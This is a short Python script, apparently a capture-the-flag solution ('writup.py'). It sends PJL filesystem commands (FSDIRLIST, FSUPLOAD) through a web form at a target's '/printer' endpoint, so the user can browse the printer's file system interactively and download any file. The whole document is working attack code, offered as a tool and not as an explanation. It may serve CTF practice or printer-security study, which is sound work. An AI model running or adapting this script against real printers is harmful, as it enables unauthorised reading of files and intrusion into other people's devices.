#!/usr/bin/env python3

import requests
from sys import argv
from bs4 import BeautifulSoup
from pprint import pprint

if __name__ == "__main__":
    if len(argv) != 2:
        print("Usage: writup.py IP:PORT")

    URL = 'http://' + argv[1] + '/printer'
    HDRS = { 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-GB;q=0.8,en-US;q=0.7,en;q=0.6', 'Cache-Control': 'max-age=0', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded' }
    PATH = '0:'
    while True:
        DATA = {'pjl': f'@PJL FSDIRLIST NAME = "{PATH}"'}
        resp = requests.post(url=URL, data=DATA)
        soup = BeautifulSoup(resp.text, 'html.parser')
        result = [y.split(' ') for y in [x[1:] for x in str(soup.p.prettify()).split('\n')[3:-1:2]]]

        for k, *t in result:
            print(f"{'dir' if 'DIR' in t[0] else 'fil'} - {k}")

        entry = None
        while not entry:
            entry = input(f"{PATH}> ")
            if entry not in list(zip(*result))[0]:
                entry = None

        typ = None
        for k, *t in result:
            if k == entry:
                typ = t[0]
                break
        
        if 'DIR' in typ:
            PATH += (('' if PATH[-1] == '/' else '/') + entry + '/')
        else:
            DATA = {'pjl': f'@PJL FSUPLOAD NAME = "{entry}"'}
            resp = requests.post(url=URL, data=DATA, headers=HDRS)
            print('-' * 42)
            print(resp.text)
            print('-' * 42)
